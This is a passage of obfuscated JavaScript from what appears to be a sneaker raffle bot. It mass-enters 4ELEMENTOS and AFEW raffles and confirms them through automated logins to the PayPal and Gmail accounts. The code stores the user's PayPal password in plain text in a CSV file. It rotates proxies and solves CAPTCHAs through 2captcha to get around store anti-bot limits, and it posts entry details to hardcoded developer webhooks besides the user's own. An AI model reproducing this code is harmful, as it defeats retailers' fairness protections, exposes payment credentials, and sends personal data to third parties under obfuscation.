        var _0x546c48 = Math['round'](Math['random']() * (_0x1aed83['length'] - 0x1));
        _0x2eaa73['Proxy'] = _0x1aed83[_0x546c48], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x1828ef = await _0x4adce7['get']('Password');
        return _0x2eaa73['Password'] = _0x1828ef['Password'], _0x4fe38c['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x2eaa73['Email'] + ',' + _0x2eaa73['Password'] + ',' + _0x2eaa73['Proxy']), _0x2eaa73;
    }
    let _0xa1d512 = await _0x46f7f3();
    var _0x2b204e = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4c09d3 = await _0x4adce7['get']('Amount'), _0xa82e50 = _0x4c09d3['Amount'];
    async function _0x1471ee() {
        let _0x3fb9d6 = 0x0;
        var _0x360857 = new _0x16dd9e({
            'user': _0x8aa917['masterMail'],
            'password': _0x8aa917['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x1ee45c(_0x4c5eb4) {
            _0x360857['openBox']('INBOX', ![], _0x4c5eb4);
        }
        _0x360857['once']('ready', function () {
            _0x1ee45c(function (_0x588ebd, _0x3b646c) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x588ebd)
                    throw _0x588ebd;
                _0x360857['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x20c810, _0x2305fe) {
                    if (!_0x2305fe || !_0x2305fe['length'])
                        console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20No\x20mails\x20found'), _0x360857['end']();
                    else {
                        _0x2305fe = _0x2305fe['slice'](0x0, _0xa82e50);
                        var _0x2b081e = _0x360857['seq']['fetch'](_0x2305fe, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2b081e['on']('message', function (_0x37e1e8, _0x12f28e) {
                            var _0x29c10a = '(#' + _0x12f28e + ')\x20';
                            _0x37e1e8['on']('body', function (_0x590787, _0x415b6c) {
                                _0x4b0324(_0x590787, (_0x5790db, _0x51f12d) => {
                                    if (_0x51f12d['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x51f12d['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x51f12d['text']['split']('[')[0x2];
                                        var _0x191e3c = mes['split'](']')[0x0];
                                        _0x2b204e['push'](_0x191e3c);
                                    }
                                });
                            }), _0x37e1e8['once']('end', function () {
                                _0x3fb9d6++;
                            });
                        }), _0x2b081e['once']('error', function (_0x4ef483) {
                            console['log']('Fetch\x20error:\x20' + _0x4ef483);
                        }), _0x2b081e['once']('end', function () {
                            _0x360857['end']();
                        });
                    }
                });
            });
        }), _0x360857['once']('error', function (_0xdb1703) {
            console['log'](_0x5b4136['red'](_0xdb1703['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x360857['once']('end', async function () {
        }), _0x360857['connect']();
    }
    try {
        _0x1471ee(), await _0x32344d(0xfa0), console['log']('Found\x20' + _0x2b204e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x32344d(0xfa0);
    }
    var _0x4e766a;
    _0x299f70('' + _0x1e15ca);
    var _0x148edd = _0xa1d512['Proxy']['split'](':'), _0x3b03c5;
    try {
        _0x3b03c5 = await _0x3d6bb6['launch']({
            'userDataDir': 'sessions/' + _0xa1d512['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x148edd[0x0] + ':' + _0x148edd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x3b03c5 = await _0x3d6bb6['launch']({
            'userDataDir': 'sessions/' + _0xa1d512['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x148edd[0x0] + ':' + _0x148edd[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Getting\x20Session');
        const _0x3224b0 = await _0x3b03c5['newPage']();
        await _0x3224b0['authenticate']({
            'username': '' + _0x148edd[0x2],
            'password': '' + _0x148edd[0x3]
        }), await _0x3224b0['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3224b0['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3224b0['waitForSelector']('#email');
            let _0x5ebebb = await _0x3224b0['$eval']('#email', _0x4975ee => _0x4975ee['getAttribute']('value'));
            if (_0x5ebebb == '') {
                await _0x3224b0['type']('#email', _0xa1d512['Email']), await _0x32344d(0x1d3);
                let _0x7fe275 = await _0x3224b0['$']('#splitPassword');
                _0x7fe275 && (await _0x3224b0['click']('#btnNext'), await _0x32344d(0xa28)), await _0x3224b0['type']('#password', _0xa1d512['Password']), await _0x32344d(0x35c), await _0x3224b0['click']('#btnLogin');
            } else
                await _0x3224b0['type']('#password', _0xa1d512['Password']), await _0x32344d(0x35c), await _0x3224b0['click']('#btnLogin');
            await _0x3224b0['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Successfully\x20logged\x20in'), await _0x32344d(0x2710);
        } catch (_0x1eb2e3) {
            throw new Error('Login\x20session\x20expired\x20' + _0x1eb2e3);
        }
        for (var _0x29f096 = 0x0; _0x29f096 < _0x2b204e['length']; _0x29f096++) {
            console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Task\x20' + (_0x29f096 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x299f70(_0x1e15ca + '\x20Task\x20' + (_0x29f096 + 0x1) + '\x20/\x20' + _0x2b204e['length']);
            const _0x67697 = await _0x3b03c5['newPage']();
            await _0x67697['goto']('' + _0x2b204e[_0x29f096], { 'waitUntil': 'networkidle2' }), await _0x32344d(0xbb8);
            try {
                const _0x922692 = await _0x67697['$']('#challenge-heading');
                _0x922692 && (console['log'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Task\x20' + (_0x29f096 + 0x1) + '\x20:\x20' + _0x5b4136['yellow']('2FA\x20Required')), await _0x67697['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x32344d(0x9c40), await _0x67697['waitForSelector']('#payment-submit-btn'), await _0x67697['$eval']('#payment-submit-btn', _0x9d88b => _0x9d88b['click']()), await _0x67697['click']('#payment-submit-btn');
                try {
                    await _0x67697['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x32344d(0x5dc), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Task\x20' + (_0x29f096 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x483cb1) {
                    _0x1221d1 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x483cb1['message']);
                } finally {
                    if (_0x1221d1 == 'yes' && _0x3c65ad != 0x2) {
                        console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1e15ca['name'] + ']\x20Task\x20' + (_0x29f096 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3c65ad + '\x20/\x205)')), _0x29f096 = _0x29f096 - 0x1, _0x3c65ad = _0x3c65ad + 0x1;
                        continue;
                    }
                    _0x1221d1 == 'yes' && _0x3c65ad >= 0x2 && (_0x4af7c0(csv[_0x29f096], _0x1e15ca), _0x1221d1 = 'no', _0x3c65ad = 0x0), await _0x67697['close'](), await _0x32344d(0x4650);
                }
            } catch (_0x297abc) {
                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1e15ca + ']\x20Task\x20' + (_0x29f096 + 0x1) + '\x20:\x20' + _0x297abc));
            }
        }
    } catch (_0xb09232) {
        console['log'](_0x5b4136['red']('' + _0xb09232));
    } finally {
        await _0x3b03c5['close']();
    }
}
const _0x502cc7 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x544072, _0x3e42cc, _0x1809ea) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x228fab = 0x0; _0x228fab < _0x3e42cc['length']; _0x228fab++) {
                        if (_0xc64281 != 'yes')
                            var _0xc64281 = '', _0x360112 = 0x0;
                        var _0x4f8ca8;
                        try {
                            await _0x4669df(_0x3e42cc, _0x228fab);
                        } catch {
                            _0xc64281 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x299f70(_0x544072['name'] + '\x20Task\x20' + (_0x228fab + 0x1) + '\x20/\x20' + _0x3e42cc['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        var _0x470fad = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x215909 = Math['round'](Math['random']() * (_0x470fad['length'] - 0x1));
                        _0x3e42cc[_0x228fab]['Size'] == 'RANDOM' && (_0x3e42cc[_0x228fab]['Size'] = _0x470fad[_0x215909]);
                        var _0x35a727 = Math['round'](Math['random']() * (_0x1809ea['length'] - 0x1)), _0x299aae = _0x1809ea[_0x35a727]['split'](':'), _0x380b9e;
                        try {
                            _0x380b9e = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x299aae[0x0] + ':' + _0x299aae[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x380b9e = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x299aae[0x0] + ':' + _0x299aae[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x43f8cf = await _0x380b9e['newPage']();
                            await _0x43f8cf['authenticate']({
                                'username': '' + _0x299aae[0x2],
                                'password': '' + _0x299aae[0x3]
                            }), await _0x43f8cf['setRequestInterception'](!![]), _0x43f8cf['on']('request', _0x28dd42 => {
                                _0x28dd42['resourceType']() === 'image' || _0x28dd42['resourceType']() === 'font' || _0x28dd42['resourceType']() === 'media' ? _0x28dd42['abort']() : _0x28dd42['continue']();
                            }), await _0x43f8cf['goto'](_0x3e42cc[_0x228fab]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x43f8cf['waitForSelector']('#accept-all-gdpr'), await _0x43f8cf['click']('#accept-all-gdpr'), await _0x43f8cf['waitForSelector']('#raffles-product'), await _0x32344d(0x3e8), await _0x43f8cf['$eval']('#raffles-product', _0x5360bc => _0x5360bc['click']()), await _0x32344d(0x1388), await _0x43f8cf['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x48fa1c = await _0x43f8cf['$']('.fancybox-inner\x20>\x20iframe'), _0x963fab = await _0x48fa1c['contentFrame']();
                            console['log'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Checking\x20Information'), await _0x963fab['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x32344d(0x1f4), await _0x963fab['type']('input[name=\x22sm-form-email\x22]', _0x3e42cc[_0x228fab]['Email']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-name\x22]', _0x3e42cc[_0x228fab]['FirstName'] + '\x20' + _0x3e42cc[_0x228fab]['LastName']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-street\x22]', _0x3e42cc[_0x228fab]['Address1'] + '\x20' + _0x3e42cc[_0x228fab]['HouseNumber'] + '\x20' + _0x3e42cc[_0x228fab]['Address2']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-city\x22]', _0x3e42cc[_0x228fab]['City']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-province\x22]', _0x3e42cc[_0x228fab]['State']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-zip\x22]', _0x3e42cc[_0x228fab]['Zip']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-country\x22]', _0x3e42cc[_0x228fab]['Country']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-form-phone\x22]', _0x3e42cc[_0x228fab]['Phone']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x3e42cc[_0x228fab]['Follower']), await _0x32344d(0xc8), await _0x963fab['type']('input[name=\x22sm-cst.size\x22]', _0x3e42cc[_0x228fab]['Size']), await _0x32344d(0x1f4), await _0x963fab['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x32344d(0x1f4), await _0x963fab['click']('.icheckbox_simple-custom'), await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Sending\x20Request'), await _0x963fab['$eval']('form', _0x229637 => _0x229637['submit']()), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xc64281 = '';
                            var _0x1018d4 = await _0xe56989(_0x3e42cc[_0x228fab], _0x544072, 'dev', ![]), _0x5e4574 = await _0xe56989(_0x3e42cc[_0x228fab], _0x544072, 'pub', ![]);
                            const _0x2afa46 = {
                                'succesDEVMSG': { 'embeds': [_0x1018d4] },
                                'succesPUBMSG': { 'embeds': [_0x5e4574] }
                            };
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2afa46['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x2afa46['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x2afa46['succesPUBMSG']);
                            } catch (_0x2b64e7) {
                                console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2b64e7));
                            }
                        } catch (_0x4b9c96) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20' + _0x4b9c96)), _0x4f8ca8 = '' + _0x4b9c96;
                            var _0x352d5e = await _0xe56989(_0x3e42cc[_0x228fab], _0x544072, 'dev', !![], _0x4f8ca8), _0x1018d4 = await _0xe56989(_0x3e42cc[_0x228fab], _0x544072, 'dev', ![]), _0x5e4574 = await _0xe56989(_0x3e42cc[_0x228fab], _0x544072, 'pub', ![]);
                            const _0x4ffbc6 = {
                                'succesDEVMSG': { 'embeds': [_0x1018d4] },
                                'succesPUBMSG': { 'embeds': [_0x5e4574] }
                            };
                            _0x4ffbc6['errorDEV'] = { 'embeds': [_0x352d5e] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4ffbc6['errorDEV']), await _0x16e110(_0x3ba800, _0x4ffbc6['errorDEV']), _0x4b9c96 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xc64281 = 'yes');
                        } finally {
                            _0x380b9e['close']();
                            if (_0xc64281 == 'yes' && _0x360112 != 0x5 && _0x4f8ca8 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Task\x20' + (_0x228fab + 0x1) + '\x20:\x20Retrying\x20(' + _0x360112 + '\x20/\x205)\x20')), _0x228fab = _0x228fab - 0x1, _0x360112 = _0x360112 + 0x1;
                                continue;
                            }
                            _0xc64281 == 'yes' && _0x360112 >= 0x5 && (_0x4af7c0(_0x3e42cc[_0x228fab], _0x544072), _0xc64281 = 'no', _0x360112 = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x544072['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x1a4be5, _0x14b7af) {
                    var _0x340156 = [];
                    async function _0x6aa049() {
                        var _0x385746 = new _0x16dd9e({
                            'user': _0x8aa917['masterMail'],
                            'password': _0x8aa917['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x35e23a(_0x58acf0) {
                            _0x385746['openBox']('INBOX', ![], _0x58acf0);
                        }
                        _0x385746['once']('ready', function () {
                            _0x35e23a(function (_0x166943, _0x501b2d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x166943)
                                    throw _0x166943;
                                _0x385746['seq']['search'](['UNSEEN'], function (_0x425694, _0x135954) {
                                    if (!_0x135954 || !_0x135954['length'])
                                        console['log'](_0xb0c82c() + '\x20[' + _0x1a4be5['name'] + ']\x20No\x20mails\x20found'), _0x385746['end']();
                                    else {
                                        var _0x433050 = _0x385746['seq']['fetch'](_0x135954, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x433050['on']('message', function (_0x3277c0, _0x3e89fc) {
                                            var _0x2a724e = '(#' + _0x3e89fc + ')\x20';
                                            _0x3277c0['on']('body', function (_0x29a80d, _0x469910) {
                                                _0x4b0324(_0x29a80d, (_0x185470, _0x105a59) => {
                                                    if (_0x105a59['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x3cdf5c = _0x105a59['html']['split']('\x0a');
                                                        for (var _0x262584 = 0x0; _0x262584 < _0x3cdf5c['length']; _0x262584++) {
                                                            if (_0x3cdf5c[_0x262584]['includes']('salesmanago') && _0x3cdf5c[_0x262584]['includes']('<td') && _0x3cdf5c[_0x262584]['includes']('href')) {
                                                                var _0x846fc9 = _0x3cdf5c[_0x262584]['split']('href=\x22'), _0x451b39 = _0x846fc9[0x1]['split']('\x22')[0x0];
                                                                _0x340156['push'](_0x451b39);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x3277c0['once']('end', function () {
                                            });
                                        }), _0x433050['once']('error', function (_0x2af601) {
                                            console['log']('Fetch\x20error:\x20' + _0x2af601);
                                        }), _0x433050['once']('end', function () {
                                            _0x385746['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x385746['once']('error', function (_0x3ba149) {
                            console['log'](_0x5b4136['red'](_0x3ba149['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x385746['once']('end', async function () {
                        }), _0x385746['connect']();
                    }
                    async function _0x3d409c(_0x1f1ffe, _0x27a317, _0x349ccb) {
                        for (var _0x6f0021 = 0x0; _0x6f0021 < _0x27a317['length']; _0x6f0021++) {
                            async function _0x3e7037(_0x387c40, _0x23cdd9, _0x3ee065, _0x555ab0, _0x30fc85) {
                                var _0x4e7c65, _0x530d3f = {}, _0x5e814e = [], _0x47fd69 = {}, _0xecb71 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4a261a = Math['round'](Math['random']() * (_0xecb71['length'] - 0x1));
                                _0x555ab0[_0x387c40]['Size'] == 'RANDOM' && (_0x555ab0[_0x387c40]['Size'] = _0xecb71[_0x4a261a]);
                                !_0x555ab0 && (_0x555ab0 = {});
                                if (_0x8aa917['useRandomProxy'] = ![])
                                    var _0x4f6c21 = _0x30fc85[_0x387c40]['split'](':');
                                else
                                    var _0x40826d = Math['round'](Math['random']() * (_0x30fc85['length'] - 0x1)), _0x4f6c21 = _0x30fc85[_0x40826d]['split'](':');
                                var _0x2de930 = {
                                    'jar': _0x1d89eb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3ee065['url'],
                                    'headers': _0x3ee065['headers'],
                                    'body': JSON['stringify'](_0x530d3f),
                                    'proxy': 'http://' + _0x4f6c21[0x2] + ':' + _0x4f6c21[0x3] + '@' + _0x4f6c21[0x0] + ':' + _0x4f6c21[0x1]
                                };
                                return _0x23cdd9 != 'ver' && (_0x2de930['url'] = _0x3ee065['url'], _0x2de930['headers'] = _0x3ee065['headers']), _0x23cdd9 == 'ver' && (_0x2de930['method'] = 'GET', _0x2de930['url'] = _0x555ab0[_0x387c40]), new Promise(function (_0x5da711, _0x25b4b9) {
                                    callback = async (_0x5f2d1e, _0x112c61, _0x33f66c) => {
                                        if (!_0x5f2d1e && _0x112c61['statusCode'] == 0xca || !_0x5f2d1e && _0x112c61['statusCode'] == 0xc8) {
                                            if (_0x23cdd9 != 'ver') {
                                                var _0x5762af = await _0xe56989(_0x555ab0[_0x387c40], _0x3ee065, 'dev', ![]), _0x23c8c1 = await _0xe56989(_0x555ab0[_0x387c40], _0x3ee065, 'pub', ![]);
                                                const _0x21840c = {
                                                    'succesDEVMSG': { 'embeds': [_0x5762af] },
                                                    'succesPUBMSG': { 'embeds': [_0x23c8c1] }
                                                };
                                                if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                                    try {
                                                        await _0x16e110(_0x8aa917['webhook'], _0x21840c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x21840c['succesDEVMSG']), await _0x32344d(0xc8);
                                                try {
                                                    await _0x16e110(_0x583375, _0x21840c['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5677a4(_0x555ab0[_0x387c40], _0x3ee065);
                                            }
                                            _0x5da711(console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x3ee065['name'] + ']\x20Task\x20' + (_0x387c40 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x23cdd9 != 'ver') {
                                                var _0x3de92c = '' + _0x5f2d1e, _0x39455b = await _0xe56989(_0x555ab0[_0x387c40], _0x3ee065, 'dev', !![], _0x3de92c), _0xbc81c8 = {};
                                                _0xbc81c8['errorDEV'] = { 'embeds': [_0x39455b] }, _0x4af7c0(_0x555ab0[_0x387c40], _0x3ee065), _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0xbc81c8['errorDEV']), await _0x16e110(_0x3ba800, _0xbc81c8['errorDEV']);
                                            }
                                            _0x25b4b9(console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x3ee065['name'] + ']\x20Task\x20' + (_0x387c40 + 0x1) + ':\x20' + _0x5f2d1e)));
                                        }
                                    };
                                    try {
                                        _0x23cdd9 != 'ver' ? console['log'](_0xb0c82c() + '\x20[' + _0x3ee065['name'] + ']\x20Task\x20' + (_0x387c40 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x530d3f['data']['attributes']['email']) : console['log'](_0xb0c82c() + '\x20[' + _0x3ee065['name'] + ']\x20Task\x20' + (_0x387c40 + 0x1) + ':\x20Fetching\x20Response'), _0x5e7c58(_0x2de930, callback);
                                    } catch (_0x32aac3) {
                                        console['log'](_0xb0c82c() + '\x20Task\x20' + (_0x387c40 + 0x1) + ':\x20' + _0x32aac3);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3e7037(_0x6f0021, 'ver', _0x1f1ffe, _0x27a317, _0x349ccb), console['log'](_0xb0c82c() + '\x20[' + _0x1f1ffe['name'] + ']\x20Sleeping\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                            } catch (_0x1eebf3) {
                            }
                        }
                    }
                    try {
                        _0x6aa049(), await _0x32344d(0xfa0), console['log']('Found\x20' + _0x340156['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x3d409c(_0x1a4be5, _0x340156, _0x14b7af);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x230f14, _0x147c2b, _0x2afe77) {
                for (var _0x156dae = 0x0; _0x156dae < _0x147c2b['length']; _0x156dae++) {
                    _0x8aa917['AfewDelay'] = _0x8aa917['delay'];
                    var _0x2e0a20;
                    if (_0x4c44f7 != 'yes')
                        var _0x4c44f7 = '', _0x5e6084 = 0x0;
                    var _0x391038 = _0x147c2b[_0x156dae]['Url'], _0x3b8874 = _0x147c2b[_0x156dae];
                    _0x299f70(_0x230f14['name'] + '\x20Task\x20' + (_0x156dae + 0x1) + '\x20/\x20' + _0x147c2b['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                    try {
                        await _0x4669df(_0x147c2b, _0x156dae);
                    } catch {
                        _0x4c44f7 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4af316(_0x155584) {
                        const _0x5870ab = _0x4fe38c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x160e25 = _0x1d9836['parse'](_0x5870ab, { 'header': !![] })['data'];
                        let _0xcf5fe = ![];
                        for (var _0x1843d2 of _0x160e25) {
                            if (_0x1843d2['Url'] == _0x155584['Url'] && _0x1843d2['Email'] == _0x155584['Email']) {
                                _0xcf5fe = !![];
                                break;
                            }
                        }
                        return _0xcf5fe;
                    }
                    if (await _0x4af316(_0x147c2b[_0x156dae]) == !![]) {
                        console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x998803 = await _0xe56989(_0x147c2b[_0x156dae], _0x230f14, 'dev', ![]), _0x2e84da = await _0xe56989(_0x147c2b[_0x156dae], _0x230f14, 'pub', ![]);
                    const _0x1527ec = {
                        'succesDEVMSG': { 'embeds': [_0x998803] },
                        'succesPUBMSG': { 'embeds': [_0x2e84da] }
                    };
                    if (_0x147c2b[_0x156dae]['Email'] == '' || _0x147c2b[_0x156dae]['FirstName'] == '' || _0x147c2b[_0x156dae]['LastName'] == '' || _0x147c2b[_0x156dae]['Country'] == '' || _0x147c2b[_0x156dae]['Size'] == '' || _0x147c2b[_0x156dae]['Address1'] == '' || _0x147c2b[_0x156dae]['Zip'] == '') {
                        console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x8aa917['useRandomProxy'] = ![])
                        var _0x2fadf5 = _0x2afe77[_0x156dae]['split'](':');
                    else
                        var _0x5d77ad = Math['round'](Math['random']() * (_0x2afe77['length'] - 0x1)), _0x2fadf5 = _0x2afe77[_0x5d77ad]['split'](':');
                    var _0x33c9c9;
                    try {
                        _0x33c9c9 = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2fadf5[0x0] + ':' + _0x2fadf5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x33c9c9 = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2fadf5[0x0] + ':' + _0x2fadf5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
